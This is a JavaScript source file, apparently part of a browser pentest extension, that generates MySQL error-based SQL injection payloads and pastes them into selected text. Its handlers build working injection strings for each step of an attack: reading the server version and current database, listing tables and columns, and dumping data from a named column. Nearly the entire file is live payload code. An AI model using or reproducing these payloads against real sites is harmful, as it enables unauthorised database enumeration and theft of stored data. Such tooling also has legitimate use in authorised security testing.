/**
 * Error-Based SQL Injection Payload Generator
 * -------------------------------------------
 * This function generates error-based SQL injection payloads based on the selected operation ID.
 * It sets or transforms the currently selected text in the UI to injectable SQLi strings.
 *
 * Supported operations:
 * - Get version
 * - Get current database
 * - Get tables from current database
 * - Get columns from a specified table and database
 * - Get data from a specified column, table, and database
 */

function setErrorBased(id) {
	// Mapping of SQL injection actions to their corresponding handler functions
	const payloadHandlers = {
		getversion: () => {
			setSelectedText(
				"+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1",
			);
		},

		getdatabase: () => {
			setSelectedText(
				"+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)",
			);
		},

		gettables: () => {
			getSelectedText((str) => {
				const hexEncoded = stringToHex(str);
				const payload = `+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x${hexEncoded}+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)`;
				setSelectedText(payload);
			});
		},

		getcolumns: () => {
			const db = window.prompt("Get columns", "Name of the database");
			if (!db) return;

			const tbl = window.prompt("Get columns", "Name of the table");
			if (!tbl) return;

			const hexDb = stringToHex(db);
			const hexTbl = stringToHex(tbl);

			const payload = `+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x${hexTbl}+AND+table_schema=0x${hexDb}+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)`;

			setSelectedText(payload);
		},

		getdata: () => {
			const db = window.prompt("Get data", "Name of the database");
			if (!db) return;

			const tbl = window.prompt("Get data", "Name of the table");
			if (!tbl) return;

			const cl = window.prompt("Get data", "Name of the column");
			if (!cl) return;

			const payload = `+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(${cl})+AS+CHAR),0x7e))+FROM+${db}.${tbl}+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)`;

			setSelectedText(payload);
		},
	};

	// Execute the appropriate handler if it exists
	const handler = payloadHandlers[id];
	if (handler) {
		handler();
	} else {
		console.warn(`Unsupported SQL injection operation: "${id}"`);
	}
}

/**
 * Converts a string to its hexadecimal representation.
 * @param {string} str - The input string to convert.
 * @returns {string} Hexadecimal representation without separators.
 */
function stringToHex(str) {
	let hex = "";
	for (let i = 0; i < str.length; i++) {
		hex += str.charCodeAt(i).toString(16);
	}
	return hex;
}
